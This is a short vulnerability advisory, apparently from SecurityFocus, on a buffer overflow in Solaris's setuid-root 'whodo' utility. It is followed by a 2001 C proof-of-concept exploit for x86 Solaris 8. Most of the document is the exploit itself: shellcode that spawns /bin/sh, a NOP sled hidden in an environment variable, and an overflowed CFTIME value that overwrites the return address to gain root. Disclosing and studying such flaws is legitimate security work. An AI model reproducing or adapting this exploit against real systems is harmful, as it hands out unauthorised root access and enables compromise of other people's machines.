source: http://www.securityfocus.com/bid/2935/info

The 'whodo' utility shipped with Sun Microsystems' Solaris provides a listing of users online and their activities. It is installed setuid root because it reads from the 'utmp' log as well as from the process table.

'whodo' contains a buffer overflow which can be exploited to gain root privileges.

#include <fcntl.h>

/*
   /usr/sbin/i86/whodo overflow proof of conecpt.

   Pablo Sor, Buenos Aires, Argentina 06/2001
   psor@afip.gov.ar, psor@ccc.uba.ar

   works against x86 solaris 8

   default offset +/- 100  should work.

*/

long get_esp() { __asm__("movl %esp,%eax"); }

int main(int ac, char **av)
{

char shell[]=
 "\xeb\x48\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31\xc0\x89\x46\xb4"
 "\x88\x46\xb9\x88\x46\x07\x89\x46\x0c\x31\xc0\x50\xb0\x8d\xe8\xdf"
 "\xff\xff\xff\x83\xc4\x04\x31\xc0\x50\xb0\x17\xe8\xd2\xff\xff\xff"
 "\x83\xc4\x04\x31\xc0\x50\x8d\x5e\x08\x53\x8d\x1e\x89\x5e\x08\x53"
 "\xb0\x3b\xe8\xbb\xff\xff\xff\x83\xc4\x0c\xe8\xbb\xff\xff\xff\x2f"
 "\x62\x69\x6e\x2f\x73\x68\xff\xff\xff\xff\xff\xff";

  unsigned long magic = get_esp() + 1180;  /* default offset */

  unsigned char buf[800];
  char *env;

  env = (char *) malloc(400*sizeof(char));
  memset(env,0x90,400);
  memcpy(env+160,shell,strlen(shell));
  memcpy(env,"SOR=",4);
  buf[399]=0;
  putenv(env);
  
  memset(buf,0x41,800);
  memcpy(buf+271,&magic,4);
  memcpy(buf,"CFTIME=",7);
  buf[799]=0;
  putenv(buf);

  system("/usr/sbin/i86/whodo");
}